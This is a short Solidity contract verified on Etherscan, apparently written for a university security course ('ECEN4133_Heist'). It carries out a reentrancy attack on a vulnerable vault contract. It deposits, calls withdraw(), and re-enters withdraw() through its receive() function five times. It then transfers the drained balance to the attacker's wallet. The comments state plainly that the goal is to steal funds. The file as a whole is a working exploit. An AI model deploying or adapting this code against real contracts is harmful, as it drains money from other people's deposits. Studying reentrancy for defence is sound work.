/**
 *Submitted for verification at Etherscan.io on 2022-12-07
*/

pragma solidity ^0.6.0;

// import "hardhat/console.sol";

interface Vuln {
    function deposit() external payable;
    function withdraw() external;
}

// Attack Premise:
// We will be conducting a reentrancy attack in order to steal from the vulnerable contract
// Source: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-02-reentrancy-b0c08cfcd555
// The vuln contract vulnerability stems from the fact that when withdraw() is called, it sends the money before updating the user's balance
// We can exploit this by calling withdraw() again before it updates our balance

contract ECEN4133_Heist  {
    Vuln public immutable vuln; // Instance of the vulnerable contract
    int count; // Number of transactions to steal money. 
    address private owner; // Attacker Wallet Address

    constructor(address vuln_vault) public{
        vuln = Vuln(vuln_vault); // vulnerable contract
        count = 0; // Stolen counter
        owner = msg.sender; // Address of the caller
    }  

    // Start the attack with specified amount to repeatedly steal
    function collect() external payable {
        // console.log("Beginning Attack...");
        // console.log("--------------------------------");
        vuln.deposit{value: msg.value}();
        vuln.withdraw();
    }  

    // Re-entrance function when the vulnerale contract pays out
    receive () external payable {
        if (count < 5) {
            count++;
            vuln.withdraw(); // Re-enter withdraw()
            // console.log("Re-entering");
        }
        else {
            count = 0;
            // console.log("Attack Completed!");
            // Transfer all of the funds to the caller's account
            payable(owner).transfer(address(this).balance);
        }
    }
}